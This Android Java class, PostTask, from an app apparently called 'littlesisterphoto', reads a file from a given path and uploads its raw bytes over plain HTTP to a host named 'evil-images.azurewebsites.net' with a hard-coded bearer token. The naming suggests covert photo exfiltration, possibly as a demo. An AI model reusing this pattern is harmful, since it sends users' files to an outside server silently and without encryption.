package no.interhost.littlesisterphoto;

import android.os.AsyncTask;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by cecilie on 10/03/17.
 */

public class PostTask extends AsyncTask<String, String, String> {
    @Override
    protected String doInBackground(String... data) {
        String api = "http://evil-images.azurewebsites.net/image";
        File file = new File(data[0]);

        byte[] content = new byte[(int) file.length()];
        try {
            new FileInputStream(file).read(content);
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost("http://evil-images.azurewebsites.net/image");
            httpPost.setEntity(new ByteArrayEntity(content));
            httpPost.setHeader("Authorization", "Bearer totallyevilstuff");
            HttpResponse response = httpclient.execute(httpPost);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "done";

    }
}
